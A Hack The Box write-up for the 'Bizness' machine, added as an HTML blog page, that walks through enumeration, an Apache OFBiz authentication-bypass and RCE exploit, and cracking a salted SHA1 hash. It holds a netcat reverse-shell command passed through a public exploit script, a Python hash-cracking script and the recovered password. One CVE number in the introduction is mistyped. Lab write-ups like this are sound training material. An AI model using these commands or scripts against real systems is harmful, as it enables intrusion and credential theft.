@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Bizness - HTB Writeup | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Bizness - HTB Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-05-06</time>
+    <span>in</span>
+    
+      <a href="/categories/hack-the-box">Hack The Box</a>
+  </strong>
+  <span> • 708 words</span>
+  <span> • 4 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cve-2023-51467">CVE-2023-51467</a>, 
+        <a href="/tags/cve-2023-49070">CVE-2023-49070</a>, 
+        <a href="/tags/linux">Linux</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>Bizness is a Easy Linux machine initially released on January 6th, 2024. As usual, I start with basic enumeration using Nmap; and from there used <code>dirsearch</code> for directory enumeration. From directory enumeration we find a login page running Apache OFBiz. This version of Apache OFBiz is vulnerable to an authentication bypass vulnerability <a href="https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/">CVE-2023-51497</a>. From here, using a public PoC script found on github, we are then able to leverage CVE-2023-49070 to get remote code execution and get a shell on the machine as the <code>ofbiz</code> user.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV 10.10.11.252
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-01-18 06:01 UTC
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.252
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 30.40 seconds
+</span></span></code></pre></div><p>Ports Open:
+<code>22, 80, 443</code>
+<img src="/posts/bizness-htb-1.png" alt="pic 1"></p>
+<p>When navigating the IP in the browser, <code>bizness.htb</code> is the domain that is shown. Let&rsquo;s go ahead and add this to <code>/etc/hosts</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;10.10.11.252 bizness.htb&#39;</span> | sudo tee -a /etc/hosts           
+</span></span><span style="display:flex;"><span>10.10.11.252 bizness.htb
+</span></span></code></pre></div><p>Next moving on to directory enumeration, after a bit of trial and error I tried <code>dirsearch</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u https://bizness.htb/
+</span></span></code></pre></div><p>From this step of enumeration, the endpoint containing the Vulnerable login was found:</p>
+<pre tabindex="0"><code>https://bizness.htb/solr/control/checkLogin/
+</code></pre><ul>
+<li>Apache OFBiz Authentication Bypass Vulnerability (CVE-2023-51467 and CVE-2023-49070)</li>
+</ul>
+<h3 id="cve-2023-49070">CVE-2023-49070</h3>
+<p>The Apache OFBiz Enterprise Resource Planning (ERP) system, a Java based web framework used across many industries. The SonicWall Threat research team&rsquo;s <a href="https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/">discovery</a> of <strong>CVE-2023-51467</strong>, a severe authentication bypass vulnerability with a CVSS score of 9.8, has unveiled an alarming risk to the system&rsquo;s integrity. This vulnerability not only exposes the ERP system to potential exploitation but also opens the door to a Server-Side Request Forgery (SSRF) exploit, presenting a dual threat to organizations relying on Apache OFBiz.
+<a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass?source=post_page-----b0045ddbc33a--------------------------------">CVE-2023-51467 and CVE-2023-49070 PoC</a></p>
+<h3 id="shell-as-ofbiz">Shell as ofbiz</h3>
+<p>Using the <code>exploit.py</code> script from the PoC above, I was able to get a shell as <code>ofbiz</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python exploit.py --url https://bizness.htb/ --cmd <span style="color:#e6db74">&#39;nc -e /bin/bash 10.10.16.9 6969&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generating payload...
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Payload generated successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sending malicious serialized payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The request has been successfully sent. Check the result of the command.
+</span></span></code></pre></div><p><img src="/posts/bizness-htb-2.png" alt="alt">
+<img src="/posts/bizness-htb-3.png" alt="alt">
+we found some important data during enumeration.</p>
+<p><img src="/posts/bizness-htb-4.png" alt="alt"></p>
+<p>Using the script below, this can be used to decrypt the password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> tqdm <span style="color:#f92672">import</span> tqdm  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PasswordEncryptor</span>:  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, hash_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SHA&#34;</span>, pbkdf2_iterations<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>):  
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param hash_type: The hash algorithm to use (default is SHA).  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>  
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>hash_type <span style="color:#f92672">=</span> hash_type  
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pbkdf2_iterations <span style="color:#f92672">=</span> pbkdf2_iterations  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crypt_bytes</span>(self, salt, value):  
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Crypt a password using the specified hash type and salt.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param salt: The salt used in the encryption.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param value: The password value to be encrypted.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :return: The encrypted password string.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> salt:  
+</span></span><span style="display:flex;"><span>            salt <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)  
+</span></span><span style="display:flex;"><span>        hash_obj <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>hash_type)  
+</span></span><span style="display:flex;"><span>        hash_obj<span style="color:#f92672">.</span>update(salt<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))  
+</span></span><span style="display:flex;"><span>        hash_obj<span style="color:#f92672">.</span>update(value)  
+</span></span><span style="display:flex;"><span>        hashed_bytes <span style="color:#f92672">=</span> hash_obj<span style="color:#f92672">.</span>digest()  
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;$</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>hash_type<span style="color:#e6db74">}</span><span style="color:#e6db74">$</span><span style="color:#e6db74">{</span>salt<span style="color:#e6db74">}</span><span style="color:#e6db74">$</span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>urlsafe_b64encode(hashed_bytes)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_crypted_bytes</span>(self, salt, value):  
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Get the encrypted bytes for a password.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param salt: The salt used in the encryption.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param value: The password value to get encrypted bytes for.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :return: The encrypted bytes as a string.  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:  
+</span></span><span style="display:flex;"><span>            hash_obj <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>hash_type)  
+</span></span><span style="display:flex;"><span>            hash_obj<span style="color:#f92672">.</span>update(salt<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))  
+</span></span><span style="display:flex;"><span>            hash_obj<span style="color:#f92672">.</span>update(value)  
+</span></span><span style="display:flex;"><span>            hashed_bytes <span style="color:#f92672">=</span> hash_obj<span style="color:#f92672">.</span>digest()  
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(hashed_bytes)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>)  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> hashlib<span style="color:#f92672">.</span>NoSuchAlgorithmException <span style="color:#66d9ef">as</span> e:  
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error while computing hash of type </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>hash_type<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage:  </span>
+</span></span><span style="display:flex;"><span>hash_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SHA1&#34;</span>  
+</span></span><span style="display:flex;"><span>salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d&#34;</span>  
+</span></span><span style="display:flex;"><span>search <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#34;</span>  
+</span></span><span style="display:flex;"><span>wordlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/usr/wordlist/rockyou.txt&#39;</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create an instance of the PasswordEncryptor class  </span>
+</span></span><span style="display:flex;"><span>encryptor <span style="color:#f92672">=</span> PasswordEncryptor(hash_type)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the number of lines in the wordlist for the loading bar  </span>
+</span></span><span style="display:flex;"><span>total_lines <span style="color:#f92672">=</span> sum(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> open(wordlist, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;latin-1&#39;</span>))  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Iterate through the wordlist with a loading bar and check for a matching password  </span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(wordlist, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;latin-1&#39;</span>) <span style="color:#66d9ef">as</span> password_list:  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> tqdm(password_list, total<span style="color:#f92672">=</span>total_lines, desc<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Processing&#34;</span>):  
+</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span>strip()  
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Get the encrypted password  </span>
+</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#f92672">=</span> encryptor<span style="color:#f92672">.</span>crypt_bytes(salt, value<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))  
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Compare with the search hash  </span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hashed_password <span style="color:#f92672">==</span> search:  
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Found Password:</span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">, hash:</span><span style="color:#e6db74">{</span>hashed_password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)  
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>  <span style="color:#75715e"># Stop the loop if a match is found</span>
+</span></span></code></pre></div><p><img src="/posts/bizness-htb-5.png" alt="alt">
+password: <code>monkeybizness</code></p>
+<p>Using the login and password we now get the root flag!</p>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
